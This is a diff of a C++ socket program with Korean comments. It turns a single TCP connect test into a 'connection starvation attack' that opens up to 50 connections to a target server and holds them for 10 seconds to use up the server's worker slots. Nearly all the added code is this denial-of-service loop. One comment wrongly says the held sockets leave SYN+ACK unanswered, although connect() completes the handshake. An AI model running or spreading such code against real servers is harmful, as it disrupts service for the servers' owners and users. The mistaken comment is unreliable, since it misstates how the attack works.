@@ -4,7 +4,6 @@
 #include <thread>
 #include <vector>
 
-
 #ifdef _WIN32
 #include <WinSock2.h> // socket handle
 #include <ws2tcpip.h> // IP 변환 함수(헤더를 변환해야 하기 때문)
@@ -52,55 +51,54 @@ int main() {
         return 1;
     }
 
-// Create TCP stream socket: IPv4, TCP
 #ifdef _WIN32
-    // 통신용 객체인 소켓을 하나 생성하는 과정
-    // SOCK_STREAM : socket type을 stream으로. (연결 지향형)
-    // IPPROTO_TCP : ip protocol로 TCP를 사용한다.
-    // SOCKET : 윈도우에서는 socket handle type을 포인터 크기(unsigned int)로 정의한다.
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    // INVALID_SOCKET은 모든 비트가 1인 값
-    if (sock == INVALID_SOCKET) {
-        std::cerr << "Socket creation failed with error: " << WSAGetLastError() << "\n";
-        WSACleanup();
-        return 1;
+    using SocketHandle = SOCKET;
+    const SocketHandle kInvalidSocket = INVALID_SOCKET;
+#else
+    using SocketHandle = int;
+    const SocketHandle kInvalidSocket = -1;
+#endif
+    const int target_connections = 50;
+    std::vector<SocketHandle> sockets;
+    sockets.reserve(target_connections);
+
+    std::cout << "[*] Starting connection starvation attack (Target: " << target_connections << " connections)...\n";
+
+    // Multi-connection creation and connect loop
+    for (int i = 0; i < target_connections; i++) {
+        SocketHandle sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (sock == kInvalidSocket) {
+            std::cerr << "[-] Socket creation failed at index " << i << "\n";
+            break;
+        }
+
+        if (connect(sock, reinterpret_cast<struct sockaddr *>(&target_addr), sizeof(target_addr)) != 0) {
+            std::cerr << "[-] Connection failed at index " << i << "\n";
+#ifdef _WIN32
+            closesocket(sock);
+#else
+            close(sock);
+#endif
+            break;
+        }
+
+        // SYN 요청 이후에 return된 SYN+ACK 에 대한 응답을 하지 않기 위해서 보관
+        sockets.push_back(sock);
     }
 
-#else
-    // Linux에서는 socket까지 File Descripter이다. 그래서 정수 취급
-    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    // linux에서는 system call 실패 시 -1을 반환하기 때문
-    if (sock < 0) {
-        std::cerr << "Socket creation failed\n";
-        return 1;
-    }
-#endif
+    std::cout << "[+] Establishing and holding " << sockets.size() << " active connections.\n";
+    std::cout << "[*] Holding connections for 10 seconds to starve server worker slots...\n";
 
-    std::cout << "[+] Socket created successfully. Socket descriptor/handle: " << sock << "\n";
+    std::this_thread::sleep_for(std::chrono::seconds(10));
 
-    // 대상 서버로 TCP 3-Way Handshake (SYN) 요청 (Initiate TCP 3-way handshake to target server)
-    if (connect(sock, reinterpret_cast<struct sockaddr *>(&target_addr), sizeof(target_addr)) != 0) {
+    std::cout << "[*] Releasing all held sockets...\n";
+    for (SocketHandle s : sockets) {
 #ifdef _WIN32
-        std::cerr << "[-] Connect failed with error: " << WSAGetLastError() << "\n";
-        closesocket(sock);
-        WSACleanup();
+        closesocket(s);
 #else
-        std::cerr << "[-] Connect failed\n";
-        close(sock);
+        close(s);
 #endif
-        return 1;
     }
-
-    std::cout << "[+] Successfully connected to " << target_ip << ":" << target_port << "\n";
-
-#ifdef _WIN32
-    // Winsock 전용 닫기 함수
-    closesocket(sock);
-#else
-    // Linux에서는 모든것이 파일이라는 철학이 있기 때문에, sock역시 파일 -> 파일 close system call
-    close(sock);
-#endif
-
 #ifdef _WIN32
     WSACleanup();
 #endif
